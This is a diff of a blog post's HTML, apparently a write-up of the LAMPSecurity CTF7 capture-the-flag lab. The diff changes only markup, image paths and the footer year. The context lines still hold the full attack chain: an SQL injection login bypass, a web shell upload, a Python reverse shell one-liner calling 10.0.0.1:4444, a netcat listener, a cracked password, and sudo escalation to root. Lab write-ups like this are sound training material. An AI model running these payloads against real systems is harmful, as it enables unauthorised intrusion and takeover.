@@ -104,7 +104,7 @@
 
 <p>Ok let’s start to enumerate the services:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>syrion@backbox:~$ nmap -sT -sV -p 1-65535 ctf07.root-me.org
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>syrion@backbox:~$ nmap -sT -sV -p 1-65535 ctf07.root-me.org
 
 PORT      STATE  SERVICE     VERSION
 22/tcp    open   ssh         OpenSSH 5.3 (protocol 2.0)
@@ -119,31 +119,31 @@ Device type: general purpose|storage-misc|broadband router|media device|WAP
 
 <p>I ran dirsearch and in the meanwhile I seen the web site on port 80:</p>
 
-<p><img src="/images/posts/2017/2017-01-06-lamp-security-ctf7-writeup/img1.png" alt="Screenshot" /></p>
+<p><img src="/images/2017-01-06-lamp-security-ctf7-writeup/img1.png" alt="Screenshot" /></p>
 
 <p>On port 8080 there was this login:</p>
 
-<p><img src="/images/posts/2017/2017-01-06-lamp-security-ctf7-writeup/img2.png" alt="Screenshot" /></p>
+<p><img src="/images/2017-01-06-lamp-security-ctf7-writeup/img2.png" alt="Screenshot" /></p>
 
 <p>The login was vulneable to SQL Injection. I logged in with ‘ or 1=1 — -. There was a kind of CMS:</p>
 
-<p><img src="/images/posts/2017/2017-01-06-lamp-security-ctf7-writeup/img3.png" alt="Screenshot" /></p>
+<p><img src="/images/2017-01-06-lamp-security-ctf7-writeup/img3.png" alt="Screenshot" /></p>
 
 <p>I uploaded a shell by creating a new reading:</p>
 
-<p><img src="/images/posts/2017/2017-01-06-lamp-security-ctf7-writeup/img4.png" alt="Screenshot" /></p>
+<p><img src="/images/2017-01-06-lamp-security-ctf7-writeup/img4.png" alt="Screenshot" /></p>
 
 <p>Before that, Dirsearch showed me the directory with all the uploaded files:</p>
 
-<p><img src="/images/posts/2017/2017-01-06-lamp-security-ctf7-writeup/img5.png" alt="Screenshot" /></p>
+<p><img src="/images/2017-01-06-lamp-security-ctf7-writeup/img5.png" alt="Screenshot" /></p>
 
 <p>Ok the shell worked:</p>
 
-<p><img src="/images/posts/2017/2017-01-06-lamp-security-ctf7-writeup/img6.png" alt="Screenshot" /></p>
+<p><img src="/images/2017-01-06-lamp-security-ctf7-writeup/img6.png" alt="Screenshot" /></p>
 
 <p>I used this python payload to open a reverse shell:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,
 socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0); 
 os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call
 (["/bin/sh","-i"]);'
@@ -151,7 +151,7 @@ os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call
 
 <p>And it worked:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>syrion@backbox:~$ nc -lvp 4444
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>syrion@backbox:~$ nc -lvp 4444
 Listening on [0.0.0.0] (family 0, port 4444)
 Connection from [212.83.142.84] port 4444 [tcp/*] accepted (family 2, sport 57758)
 sh: no job control in this shell
@@ -164,7 +164,7 @@ uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_
 
 <p>After some local enumerations, I found the credentials of mysql in a php page, so I accessed to mysql and I found some interesting credentials:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-4.1$ mysql -u root
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-4.1$ mysql -u root
 mysql -u root
 Welcome to the MySQL monitor.  Commands end with ; or \g.
 Your MySQL connection id is 26
@@ -235,11 +235,11 @@ select username,password from users;
 
 <p>I used Crackstation to crack all the hashes:</p>
 
-<p><img src="/images/posts/2017/2017-01-06-lamp-security-ctf7-writeup/img7.png" alt="Screenshot" /></p>
+<p><img src="/images/2017-01-06-lamp-security-ctf7-writeup/img7.png" alt="Screenshot" /></p>
 
 <p>At this point I tried to become the user brian:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-4.1$ su brian
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-4.1$ su brian
 su brian
 Password: my2cents
 [brian@localhost inc]$ id
@@ -249,7 +249,7 @@ uid=501(brian) gid=501(brian) groups=501(brian),10(wheel),500(webdev),512(admin)
 
 <p>The user Brian was a sudo user, and I become root:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[brian@localhost inc]$ sudo su
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[brian@localhost inc]$ sudo su
 sudo su
 
 We trust you have received the usual lecture from the local System
@@ -311,7 +311,7 @@ cat /passwd
         <div class="row">
   <div class="col-lg-8 col-lg-offset-2">
     <footer>
-      Syrion © 2018 
+      Syrion © 2020 
     </footer>
   </div>
 </div>
